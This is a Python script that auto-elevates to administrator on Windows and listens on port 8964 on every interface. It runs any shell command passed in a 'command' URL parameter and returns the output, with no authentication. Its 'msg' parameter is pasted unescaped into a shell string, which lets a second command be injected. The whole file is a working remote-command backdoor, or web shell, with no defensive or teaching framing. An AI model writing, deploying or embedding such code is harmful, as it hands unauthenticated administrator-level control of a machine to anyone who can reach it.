import os
import platform
import subprocess
from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
from elevate import elevate

is_windows = platform.system().lower() == "windows"
if is_windows:
    elevate()

class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        url = urllib.parse.urlparse(self.path)
        query = urllib.parse.parse_qs(url.query)
        command = query.get('command', [None])[0]
        msg = query.get('msg', [None])[0]

        if not command and not msg:
            self.send_response(400)
            self.end_headers()
            self.wfile.write(b'Missing both "command" and "msg" parameters.')
            return

        outputs = []

        if command:
            try:
                result = subprocess.run(command, shell=True, text=True, capture_output=True)
                outputs.append(result.stdout + result.stderr)
            except Exception as e:
                outputs.append(f"Error executing command: {str(e)}")

        if msg:
            msg_command = f'msg * "{msg}"'
            try:
                result = subprocess.run(msg_command, shell=True, text=True, capture_output=True)
                outputs.append(result.stdout + result.stderr)
            except Exception as e:
                outputs.append(f"Error executing msg: {str(e)}")

        self.send_response(200)
        self.send_header('Content-Type', 'text/plain; charset=utf-8')
        self.end_headers()
        self.wfile.write("\n".join(outputs).encode('utf-8'))

def run_server():
    server_address = ('', 8964)
    httpd = HTTPServer(server_address, RequestHandler)
    print("Listening port 8964...")
    httpd.serve_forever()

if __name__ == "__main__":
    run_server()